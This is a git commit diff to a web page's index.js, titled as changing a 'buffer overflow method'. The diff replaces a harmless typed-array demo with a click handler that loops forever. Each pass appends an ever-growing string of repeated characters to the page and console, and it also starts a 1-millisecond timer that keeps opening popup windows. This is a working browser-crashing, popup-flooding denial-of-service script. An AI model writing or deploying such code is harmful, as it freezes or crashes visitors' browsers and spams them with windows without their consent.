e53200a7ed3cb06dce3f34b32e54558f82ba6401
Marko2155 <98662057+Marko2155@users.noreply.github.com>
2025-01-26 10:36:27 +0100

    Changed buffer overflow method + user agent displays

--- index.js
+++ index.js
@@ -1,6 +1,20 @@
 document.getElementById("clickme").addEventListener("click", function() {
-    let arr = new Uint8Array(4);  // An array with 4 bytes (0-3 index)
-    arr[0] = 10;
-    arr[4] = 20;  // Out of bounds (array length is 4, valid indices are 0-3)
-    console.log(arr[4]);  // Returns undefined, safe handling in JavaScript
+    txt = "";
+
+    for(var i = 0; i === i; i++) {
+       txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(99);
+    
+       var x = document.createElement("div");
+       x.innerText = txt;
+    
+      document.body.appendChild(x)
+      console.log(txt);
+      
+      setInterval(function () {
+        open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
+      }, 1);
+    }
+    
 })
+
+document.getElementById("ua").value = navigator.userAgent
